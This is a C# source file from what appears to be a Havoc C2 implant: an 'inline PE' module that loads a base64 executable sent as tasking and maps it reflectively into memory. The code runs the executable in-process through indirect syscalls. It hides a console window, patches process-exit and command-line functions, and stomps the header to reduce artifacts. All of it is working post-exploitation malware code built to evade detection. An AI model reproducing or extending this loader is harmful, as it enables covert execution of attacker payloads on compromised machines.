using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static HavocImplant.NativeUtils.Structs;
using static HavocImplant.NativeUtils.Structs.Win32;
using HavocImplant.NativeUtils;

namespace HavocImplant.AgentFunctions
{

    //Thanks apollo and nettitude
    public class InlinePE
    {
 
        // idk why i rewrote this one
        public IntPtr GetStdHandle(int nStdHandle)
        {
            IntPtr pInformation = IntPtr.Zero;
            object[] allocArgs = new object[] { (IntPtr)(-1), pInformation, IntPtr.Zero, (IntPtr)0x38, Enums.AllocationType.Commit | Enums.AllocationType.Reserve, Enums.MemoryProtection.ReadWrite };
            ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", allocArgs);
            pInformation = (IntPtr)allocArgs[1];

            object[] queryArgs = new object[] { (IntPtr)(-1), 0,  pInformation, (uint)Marshal.SizeOf(typeof(Structs.Win32.PROCESS_BASIC_INFORMATION)), IntPtr.Zero}; //class 0 = PBI
            ntdll.indirectSyscallInvoke<Delegates.NtQueryInformationProcess>("NtQueryInformationProcess", queryArgs);
            pInformation = (IntPtr)queryArgs[2];
            Structs.Win32.PROCESS_BASIC_INFORMATION pbi = (Structs.Win32.PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pInformation, typeof(Structs.Win32.PROCESS_BASIC_INFORMATION));

            IntPtr pProccessParams = Marshal.ReadIntPtr(IntPtr.Add(pbi.PebAddress, 0x20)); // PEB addr is 0x20 into PBI

            ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", new object[] { (IntPtr)(-1), pInformation, (IntPtr)Marshal.SizeOf(pbi), (uint)0x8000 });

            switch (nStdHandle)
            {
                case STD_OUTPUT_HANDLE:
                    return Marshal.ReadIntPtr(IntPtr.Add(pProccessParams, 0x28));
                case STD_ERROR_HANDLE:
                    return Marshal.ReadIntPtr(IntPtr.Add(pProccessParams, 0x30));
            }
            return IntPtr.Zero;
        }
        public bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize)
        {
            object[] args = new object[] { IntPtr.Zero, IntPtr.Zero, lpPipeAttributes, nSize };
            bool retVal = (bool)kernel32.dynamicExecute<Delegates.CreatePipe>("CreatePipe", args);
            hReadPipe = (IntPtr)args[0];
            hWritePipe = (IntPtr)args[1];
            lpPipeAttributes = (SECURITY_ATTRIBUTES)args[2];
            return retVal;
        }
        public bool SetStdHandle(int nStdHandle, IntPtr hHandle)
        { 
            return (bool)kernel32.dynamicExecute<Delegates.SetStdHandle>("SetStdHandle", new object[] { nStdHandle, hHandle});
        }
        public bool AllocConsole()
        {
            return (bool)kernel32.dynamicExecute<Delegates.AllocConsole>("AllocConsole", new object[]{ });
        }
        public IntPtr GetConsoleWindow()
        {
            return (IntPtr)kernel32.dynamicExecute<Delegates.GetConsoleWindow>("GetConsoleWindow", new object[] { });
        }
        public bool HideWindow(IntPtr hWnd) 
        {
            return (bool)user32.dynamicExecute<Delegates.ShowWindow>("ShowWindow", new object[] { hWnd, 0 });
        }
        public bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped)
        {
            object[] args = new object[] { hFile, lpBuffer, nNumberOfBytesToRead, (uint)0, lpOverlapped };
            bool retVal = (bool)kernel32.dynamicExecute<Delegates.ReadFile>("ReadFile", args);
            lpBuffer = (byte[])args[1];
            lpNumberOfBytesRead = (uint)args[3];
            return retVal;
        }
        public bool CloseHandle(IntPtr hObject) 
        {
            return (bool)kernel32.dynamicExecute<Delegates.CloseHandle>("CloseHandle", new object[] { hObject});
        }

        public byte[] rawbytes;
        public int size;
        Implant agent;
        dll ntdll = globalDll.ntdll;
        dll kernel32 = globalDll.kernel32;
        dll win32u = globalDll.win32u;
        dll user32 = globalDll.user32;
        public string output;
        // General PE stuff
        public Structs.Win32.IMAGE_DOS_HEADER dosHeader;
        public Structs.Win32.IMAGE_FILE_HEADER fileHeader;
        public Structs.Win32.IMAGE_OPTIONAL_HEADER64 optionalHeader;
        public Structs.Win32.IMAGE_SECTION_HEADER[] imageSectionHeaders;
        public IntPtr peBase = IntPtr.Zero;
        public List<String> originalModules = new List<String>();

        // To prevent thread exiting from killing the process
        byte[] terminateProcessOriginalBytes;
        byte[] corExitProcessOriginalBytes;
        byte[] ntTerminateProcessOriginalBytes;
        byte[] rtlExitUserProcessOriginalBytes;

        // For arg fixing
        public string fileName;
        public string[] args;
        byte[] originalCommandLineFuncBytes;
        string commandLineFunc;

        //Additional artifacts to clear at the end
        public Dictionary<IntPtr, uint> sectionAddresses = new Dictionary<IntPtr, uint>();

        // File Descriptor Shit
        public struct FileDescriptorPair 
        {
            public IntPtr Read;
            public IntPtr Write;
        }
        private const int STD_OUTPUT_HANDLE = -11;
        private const int STD_ERROR_HANDLE = -12;
        private const uint BYTES_TO_READ = 1024;

        private IntPtr _oldGetStdHandleOut;
        private IntPtr _oldGetStdHandleError;

        private FileDescriptorPair _kpStdOutPipes;
        private Task<string> _readTask;

        private IntPtr hWin;

        public static void Run(Implant agent, string taskInfo, int taskId)
        {

            byte[] pe_bytes = Convert.FromBase64String(taskInfo.Split(new char[] { ';' }, 2)[0].Substring(5));
            Console.WriteLine($"PE is {pe_bytes.Length} bytes long");
            string[] args = taskInfo.Split(new char[] { ';' }, 2)[1].Split(' ');

            var pe = new InlinePE(agent, pe_bytes, "bruh", args);
            agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [inline_pe]\n" + pe.output).Replace("\\", "\\\\").Replace("\"", "\\\""));
            
        }
        /// <summary>
        /// Reads and parses properties of the PE from disc. Temporarily writes into memory.
        /// </summary>
        /// <param name="ntdll"></param> An ntdll instance for indirect syscalls
        /// <param name="pe"></param> PE byte array
        public InlinePE(Implant agent, byte[] pe, string fileName, string[] args)
        {
            this.agent = agent;
            this.ntdll = ntdll;
            this.fileName = fileName;
            this.args = args;
            rawbytes = pe;

            IntPtr tmpPtrDosHeader = IntPtr.Zero;
            object[] argsNtAllocateVirtualMemory = new object[] { (IntPtr)(-1), tmpPtrDosHeader, IntPtr.Zero, (IntPtr)pe.Length, Structs.Win32.Enums.AllocationType.Commit | Structs.Win32.Enums.AllocationType.Reserve, Structs.Win32.Enums.MemoryProtection.ReadWrite};
            ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", argsNtAllocateVirtualMemory); //Allocate space for the PE
            tmpPtrDosHeader = (IntPtr)argsNtAllocateVirtualMemory[1];

            var unmanagedBytes = GCHandle.Alloc(rawbytes, GCHandleType.Pinned);
            ntdll.indirectSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory", new object[] { (IntPtr)(-1), tmpPtrDosHeader, unmanagedBytes.AddrOfPinnedObject(), (uint)pe.Length, (uint)0});
            unmanagedBytes.Free();

            dosHeader = (Structs.Win32.IMAGE_DOS_HEADER)Marshal.PtrToStructure(tmpPtrDosHeader, typeof(Structs.Win32.IMAGE_DOS_HEADER));

            IntPtr tmpPtrFileHeader = IntPtr.Add(tmpPtrDosHeader, (int)dosHeader.e_lfanew+4); //FileHeader is 4 bytes into the NT header
            fileHeader = (Structs.Win32.IMAGE_FILE_HEADER)Marshal.PtrToStructure(tmpPtrFileHeader, typeof(Structs.Win32.IMAGE_FILE_HEADER));

            IntPtr tmpPtrOptionalHeader = IntPtr.Add(tmpPtrFileHeader, 20);
            optionalHeader = (Structs.Win32.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(tmpPtrOptionalHeader, typeof(Structs.Win32.IMAGE_OPTIONAL_HEADER64));

            imageSectionHeaders = new Structs.Win32.IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int i = 0; i < imageSectionHeaders.Length; i++)
            {
                IntPtr tmpPtrImageSectionHeader = IntPtr.Zero;
                if (i == 0) tmpPtrImageSectionHeader = IntPtr.Add(tmpPtrOptionalHeader, Marshal.SizeOf(optionalHeader));
                else tmpPtrImageSectionHeader = IntPtr.Add(tmpPtrOptionalHeader, Marshal.SizeOf(optionalHeader) + Marshal.SizeOf(imageSectionHeaders[i-1])*i);
                imageSectionHeaders[i] = (Structs.Win32.IMAGE_SECTION_HEADER)Marshal.PtrToStructure(tmpPtrImageSectionHeader, typeof(Structs.Win32.IMAGE_SECTION_HEADER));
            }
#if debug
            Console.WriteLine("Base of PE is at 0x{0:X}", (long)tmpPtrDosHeader);
            Console.WriteLine("Nt headers at 0x{0:X}", (long)IntPtr.Add(tmpPtrFileHeader, -4));
            Console.WriteLine("Opt headers at 0x{0:X}", (long)tmpPtrOptionalHeader);
#endif
            ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", new object[] { (IntPtr)(-1), tmpPtrDosHeader, (IntPtr)Marshal.SizeOf(dosHeader), (uint)0x8000 });//Stomp header
            Map();
            ImportResolver();
            PatchExit();
            UpdateArgs();
            BeginRedirect();
            BeginRead();
            RunPE();
            ReturnPatches();
            EndRedirect();
            ReadOutput();
        }
        public void Map()
        {
            object[] argsNtAllocateVirtualMemory = new object[] { (IntPtr)(-1), peBase, IntPtr.Zero, (IntPtr)optionalHeader.SizeOfImage, Structs.Win32.Enums.AllocationType.Commit, Structs.Win32.Enums.MemoryProtection.ReadWrite };
            ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", argsNtAllocateVirtualMemory);
            peBase = (IntPtr)argsNtAllocateVirtualMemory[1];

            // Copy Sections
            for (int i = 0; i < fileHeader.NumberOfSections; i++)
            {
                IntPtr sectionLocation = IntPtr.Add(peBase, (int)imageSectionHeaders[i].VirtualAddress);
                argsNtAllocateVirtualMemory = new object[] { (IntPtr)(-1), sectionLocation, IntPtr.Zero, (IntPtr)imageSectionHeaders[i].SizeOfRawData, Structs.Win32.Enums.AllocationType.Commit, Win32.Enums.PAGE_READWRITE };
                ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", argsNtAllocateVirtualMemory);
                sectionLocation = (IntPtr)argsNtAllocateVirtualMemory[1];
#if debug
                Console.WriteLine("Copying {0} to 0x{1:X}", new string(imageSectionHeaders[i].Name), (long)sectionLocation);
#endif

                var unmanagedBytes = GCHandle.Alloc(rawbytes.ToList().GetRange((int)imageSectionHeaders[i].PointerToRawData, (int)imageSectionHeaders[i].SizeOfRawData).ToArray(), GCHandleType.Pinned);
                ntdll.indirectSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory", new object[] { (IntPtr)(-1), sectionLocation, unmanagedBytes.AddrOfPinnedObject(), (uint)imageSectionHeaders[i].SizeOfRawData, (uint)0 });
                sectionAddresses.Add(sectionLocation, imageSectionHeaders[i].SizeOfRawData);
                unmanagedBytes.Free();

            }



            // Base Relocations
            long delta = (long)peBase - (long)optionalHeader.ImageBase;
            IntPtr pRelocationTable = IntPtr.Add(peBase, (int)optionalHeader.BaseRelocationTable.VirtualAddress);
            Structs.Win32.IMAGE_BASE_RELOCATION relocationEntry = (Structs.Win32.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(pRelocationTable, typeof(Structs.Win32.IMAGE_BASE_RELOCATION));

            // Starting values
            int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(Structs.Win32.IMAGE_BASE_RELOCATION));
            IntPtr nextEntry = pRelocationTable;
            int sizeOfNextBlock = (int)relocationEntry.SizeOfBlock;
            IntPtr offset = pRelocationTable;
            while (true)
            {

                IntPtr pRelocationTableNextBlock = IntPtr.Add(pRelocationTable, sizeOfNextBlock);
                Structs.Win32.IMAGE_BASE_RELOCATION nextRelocationEntry = (Structs.Win32.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(pRelocationTableNextBlock, typeof(Structs.Win32.IMAGE_BASE_RELOCATION));
                IntPtr pRelocationEntry = IntPtr.Add(peBase, (int)relocationEntry.VirtualAdress);
#if debug
                Console.WriteLine("Section Has {0} Entries",(int)(relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) /2);
                Console.WriteLine("Next Section Has {0} Entries", (int)(nextRelocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2);
#endif
                for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++) // TODO figure out magic numbers
                {
                    UInt16 value = (ushort)Marshal.ReadInt16(offset, 8 + 2 * i); // TODO figure out magic numbers
                    UInt16 type = (ushort)(value >> 12); // TODO figure out magic numbers
                    UInt16 fixup = (ushort)(value & 0xfff); // TODO figure out magic numbers

                    switch (type)
                    {
                        case 0x0:
                            break;
                        case 0xA:
                            var patchAddress = (IntPtr)(pRelocationEntry.ToInt64() + fixup);
                            var originalAddr = Marshal.ReadInt64(patchAddress);
                            Marshal.WriteInt64(patchAddress, originalAddr + delta);
                            break;
                    }
                }
                offset = (IntPtr)(pRelocationTable.ToInt64() + sizeOfNextBlock);
                sizeOfNextBlock += (int)nextRelocationEntry.SizeOfBlock;
                relocationEntry = nextRelocationEntry;
                nextEntry = (IntPtr)(nextEntry.ToInt64() + sizeOfNextBlock);

                if (nextRelocationEntry.SizeOfBlock == 0) break;
            }

            return;
        }
        public void ImportResolver()
        {
            int IDT_SINGLE_ENTRY_LENGTH = 20; // Each Import Directory Table entry is 20 bytes long https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#import-directory-table
            int IDT_IAT_OFFSET = 16; // Offset in IDT to Relative Virtual Address to the Import Address Table for this DLL
            int IDT_DLL_NAME_OFFSET = 12; // Offset in IDT to DLL name for this DLL
            int ILT_HINT_LENGTH = 2; // Length of the 'hint' prefix to the function name in the ILT/IAT

            var currentProcess = Process.GetCurrentProcess();
            foreach (ProcessModule module in currentProcess.Modules)
            {
                originalModules.Add(module.ModuleName);
            }

            // Resolve Imports
            IntPtr pIDT = IntPtr.Add(peBase, (int)optionalHeader.ImportTable.VirtualAddress);
            int dllIterator = 0;
            while (true)
            {
                IntPtr pDllImportTableEntry = IntPtr.Add(pIDT, IDT_SINGLE_ENTRY_LENGTH * dllIterator);

                int iatRVA = Marshal.ReadInt32(pDllImportTableEntry, IDT_IAT_OFFSET);
                IntPtr pIAT = IntPtr.Add(peBase, iatRVA);

                int dllNameRVA = Marshal.ReadInt32(IntPtr.Add(pDllImportTableEntry, IDT_DLL_NAME_OFFSET));
                IntPtr pDllname = IntPtr.Add(peBase, dllNameRVA);
                string dllName = Marshal.PtrToStringAnsi(pDllname);

                if (string.IsNullOrEmpty(dllName)) break;

                IntPtr moduleHandle = IntPtr.Zero;
                object[] argsLdrLoadDLL = new object[] { dllName };
                moduleHandle = (IntPtr)Utils.dynamicAPIInvoke<Delegates.LoadLibraryA>("kernel32.dll", "LoadLibraryA", argsLdrLoadDLL);        

                IntPtr pCurrentIATEntry = pIAT;
                while (true) // For each DLL iterate over its functions in the IAT and patch the IAT with the real address https://tech-zealots.com/malware-analysis/journey-towards-import-address-table-of-an-executable-file/
                {
                    IntPtr pDllFuncName = IntPtr.Add(peBase, Marshal.ReadInt32(pCurrentIATEntry) + ILT_HINT_LENGTH);
                    string dllFuncName = Marshal.PtrToStringAnsi(pDllFuncName);
                    if (string.IsNullOrEmpty(dllFuncName)) break;

                    IntPtr pRealFunction = Utils.getFuncLocation(moduleHandle, dllFuncName);
                    if (pRealFunction == IntPtr.Zero) break;
                    else Marshal.WriteInt64(pCurrentIATEntry, pRealFunction.ToInt64());

                    //Console.WriteLine("Function {0}", dllFuncName);
                    pCurrentIATEntry = IntPtr.Add(pCurrentIATEntry, IntPtr.Size); // Shift the current entry to point to the next entry along, as each entry is just a pointer this is one IntPtr.Size
                }
                dllIterator++;
            }
        }
        public void PatchExit()
        {
            IntPtr pExitThread = Utils.getFuncLocation("kernelbase", "ExitThread");
            /*
                mov rcx, 0x0 #takes first arg
                mov rax, <ExitThread> # 
                push rax
                ret
            */
            List<byte> exitThreadPatchBytes = new List<byte>() { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
            byte[] pExitThreadAsByes = BitConverter.GetBytes((long)pExitThread);
            exitThreadPatchBytes.AddRange(pExitThreadAsByes);
            exitThreadPatchBytes.Add(0x50);
            exitThreadPatchBytes.Add(0xC3);

            terminateProcessOriginalBytes = Utils.PatchFunction(ntdll, "kernelbase", "TerminateProcess", exitThreadPatchBytes.ToArray());
            corExitProcessOriginalBytes = Utils.PatchFunction(ntdll, "mscoree", "CorExitProcess", exitThreadPatchBytes.ToArray());
            rtlExitUserProcessOriginalBytes = Utils.PatchFunction(ntdll,"ntdll", "RtlExitUserProcess", exitThreadPatchBytes.ToArray());
            
        }
        public void UpdateArgs()
        {
            bool PatchGetCommandLineFunc(dll ntdll, string newCommandLineString)
            {
                IntPtr pCommandLineString = (IntPtr)Utils.dynamicAPIInvoke<Delegates.GetCommandLineA>("Kernel32", "GetCommandLineW", new object[] { });
                string commandLineString = Marshal.PtrToStringAuto(pCommandLineString);

                Encoding _encoding = Encoding.UTF8;

                if (commandLineString != null)
                {
                    var stringBytes = new byte[commandLineString.Length];

                    // Copy the command line string bytes into an array and check if it contains null bytes (so if it is wide or not
                    Marshal.Copy(pCommandLineString, stringBytes, 0, commandLineString.Length); // Even if ASCII won't include null terminating byte

                    if (!new List<byte>(stringBytes).Contains(0x00)) _encoding = Encoding.ASCII; // At present assuming either ASCII or UTF8

                }

                // Set the GetCommandLine func based on the determined encoding
                commandLineFunc = _encoding.Equals(Encoding.ASCII) ? "GetCommandLineA" : "GetCommandLineW"; // We're always reading GetCommandLineW so idk why this matters
                // Write the new command line string into memory
                IntPtr pNewString = _encoding.Equals(Encoding.ASCII)
                    ? Marshal.StringToHGlobalAnsi(newCommandLineString)
                    : Marshal.StringToHGlobalUni(newCommandLineString);

                // Create the patch bytes that provide the new string pointer
                var patchBytes = new List<byte>() { 0x48, 0xB8 }; // TODO architecture
                var pointerBytes = BitConverter.GetBytes(pNewString.ToInt64());

                patchBytes.AddRange(pointerBytes);

                patchBytes.Add(0xC3);

                // Patch the GetCommandLine function to return the new string
                originalCommandLineFuncBytes = Utils.PatchFunction(ntdll, "kernelbase", commandLineFunc, patchBytes.ToArray());
                if (originalCommandLineFuncBytes == null) return false;
                return true;
            }

            string newCommandLineString = $"\"{fileName}\" {string.Join(" ", args)}";
 
            // Patching GetCommandLine and running the PE
            PatchGetCommandLineFunc(ntdll, newCommandLineString);
            
        }
        public void BeginRedirect()
        {
            AllocConsole();
            hWin = GetConsoleWindow();
            HideWindow(hWin);

            _oldGetStdHandleOut = GetStdHandle(STD_OUTPUT_HANDLE);
            _oldGetStdHandleError = GetStdHandle(STD_ERROR_HANDLE);
            
            //Creating STDOut/IN/ERR Pipes to redirect to
            Structs.Win32.SECURITY_ATTRIBUTES outSA = default;
            outSA.nLength = Marshal.SizeOf(outSA);
            outSA.bInheritHandle = 1;
            CreatePipe(out var read, out var write, ref outSA, 0);
            _kpStdOutPipes = new FileDescriptorPair() { Read = read, Write = write};

            //Setting the new pipes
            SetStdHandle(STD_OUTPUT_HANDLE, _kpStdOutPipes.Write);
            SetStdHandle(STD_ERROR_HANDLE, _kpStdOutPipes.Write);

        }
        public void RunPE()
        {
            // Adjusting memory protections before takeoff
            for (int i = 0; i < fileHeader.NumberOfSections; i++)
            {
                IntPtr sectionLocation = IntPtr.Add(peBase, (int)imageSectionHeaders[i].VirtualAddress);
                
                uint memProtectionConstant = 0;
                Structs.Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS sectionProtect = (Structs.Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS)imageSectionHeaders[i].Characteristics;

                if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_READ) && sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_EXECUTE) && sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_WRITE))
                    memProtectionConstant = Win32.Enums.PAGE_EXECUTE_READWRITE;
                else if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_READ) && sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_EXECUTE))
                    memProtectionConstant = Win32.Enums.PAGE_EXECUTE_READ;
                else if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_READ) && sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_WRITE))
                    memProtectionConstant = Win32.Enums.PAGE_READWRITE;
                else if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_EXECUTE) && sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_WRITE))
                    memProtectionConstant = Win32.Enums.PAGE_EXECUTE_WRITECOPY;
                else if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_WRITE))
                    memProtectionConstant = Win32.Enums.PAGE_WRITECOPY;
                else if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_EXECUTE))
                    memProtectionConstant = Win32.Enums.PAGE_EXECUTE;
                else if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_READ))
                    memProtectionConstant = Win32.Enums.PAGE_READONLY;
                
                object[] argsNtProtectVirtualMemory = new object[] { (IntPtr)(-1), sectionLocation, (IntPtr)imageSectionHeaders[i].SizeOfRawData, memProtectionConstant, (uint)0 }; //fixing the 
                ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", argsNtProtectVirtualMemory);
            }
            
            IntPtr threadStartAddress = IntPtr.Add(peBase, (int)optionalHeader.AddressOfEntryPoint);
            IntPtr threadHandle = IntPtr.Zero;

            object[] argsNtCreateThreadEx = new object[] { threadHandle, Structs.Win32.Enums.ACCESS_MASK.GENERIC_ALL, IntPtr.Zero, Process.GetCurrentProcess().Handle, threadStartAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero };
            ntdll.indirectSyscallInvoke<Delegates.NtCreateThreadEx>("NtCreateThreadEx", argsNtCreateThreadEx);

            threadHandle = (IntPtr)argsNtCreateThreadEx[0];

            Structs.LargeInteger li = new Structs.LargeInteger();
            long second = -10000000L;
            li.QuadPart = 5*second;

            IntPtr pLargeInt = IntPtr.Zero;
            object[] allocArgs = new object[] { (IntPtr)(-1), pLargeInt, IntPtr.Zero, (IntPtr)Marshal.SizeOf(pLargeInt), Enums.AllocationType.Commit | Enums.AllocationType.Reserve, Enums.MemoryProtection.ReadWrite };
            ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", allocArgs);
            pLargeInt = (IntPtr)allocArgs[1];

            GCHandle unmanagedLargeInt = GCHandle.Alloc(li, GCHandleType.Pinned);
            ntdll.indirectSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory", new object[] { (IntPtr)(-1), pLargeInt, unmanagedLargeInt.AddrOfPinnedObject(), (uint)Marshal.SizeOf(li), (uint)0 });
            unmanagedLargeInt.Free();

            ntdll.indirectSyscallInvoke<Delegates.NtWaitForSingleObject>("NtWaitForSingleObject", new object[] { threadHandle, false, pLargeInt });

            ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", new object[] { (IntPtr)(-1), pLargeInt, (IntPtr)Marshal.SizeOf(pLargeInt), (uint)0x8000 });

            foreach (var section in sectionAddresses)
            {
                ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", new object[] { (IntPtr)(-1), section.Key, (IntPtr)section.Value, (uint)0x8000 });
            }
        }
        public void ReturnPatches()
        {
            Utils.PatchFunction(ntdll, "kernelbase", commandLineFunc, originalCommandLineFuncBytes.ToArray());
            Utils.PatchFunction(ntdll, "kernelbase", "TerminateProcess", terminateProcessOriginalBytes.ToArray());
            Utils.PatchFunction(ntdll, "mscoree", "CorExitProcess", corExitProcessOriginalBytes.ToArray());
            Utils.PatchFunction(ntdll, "ntdll", "RtlExitUserProcess", rtlExitUserProcessOriginalBytes.ToArray());
        }
        public void BeginRead()
        {
            _readTask = Task.Factory.StartNew(() =>
            {
                output = "";

                var buffer = new byte[BYTES_TO_READ];
                byte[] outBuffer;

                while (true)
                {
                    bool ok = ReadFile(_kpStdOutPipes.Read, buffer, BYTES_TO_READ, out uint bytesRead, IntPtr.Zero);
                    if (!ok) break;
                    if (bytesRead != 0)
                    {
                        outBuffer = new byte[bytesRead];
                        Array.Copy(buffer, outBuffer, bytesRead);
                        output += Encoding.Default.GetString(outBuffer);
                    }
                }
                return output;
            });
        }
        public void EndRedirect()
        {
            
            SetStdHandle(STD_OUTPUT_HANDLE, _oldGetStdHandleOut);
            SetStdHandle(STD_ERROR_HANDLE, _oldGetStdHandleError);
            user32.dynamicExecute<Delegates.DestroyWindow>("DestroyWindow", new object[] { hWin });
            try
            {
                // Need to close write before read else it hangs as could still be writing
                if (_kpStdOutPipes.Write != IntPtr.Zero)
                {
                    CloseHandle(_kpStdOutPipes.Write);
                }

                if (_kpStdOutPipes.Read != IntPtr.Zero)
                {
                    CloseHandle(_kpStdOutPipes.Read);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error closing handles: {e}");
            }
        }
        public void ReadOutput()
        {
            while (!_readTask.IsCompleted)
            {
                Thread.Sleep(2000);
            }

            output =  _readTask.Result;
        }

    }
}
